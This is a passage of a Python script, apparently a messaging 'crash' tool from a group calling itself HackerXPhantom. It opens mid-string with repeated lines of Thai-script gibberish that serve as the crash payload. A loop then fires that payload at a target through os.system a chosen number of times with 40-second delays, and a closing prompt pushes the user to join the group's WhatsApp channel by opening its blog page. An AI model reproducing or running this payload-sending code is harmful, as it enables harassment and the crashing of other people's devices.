881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
88141
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
88141
""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now\n")
		print(f"{G}[{Y}+{G}]{M}Applying 40sec delay...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{R}[×] Failed  ")
		time.sleep(0.2)
	return main()

def MSG():
	print(Y)
	YTC = input("Have U Join Us ? (Y/N): ")
	if YTC == 'Y' or YTC == 'y':
		print(G)
		print("Thank You For Joining Us...\n")
		time.sleep(4)
		print("Initializing tool...")
		time.sleep(4)		
		print(W + "\n\n")
		main()
	elif YTC == 'N' or YTC == 'n':
		print("")
		os.system("xdg-open https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(8)
		os.system("xdg-open https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(3)
		print(W + "\n\n")
		main()

MSG()
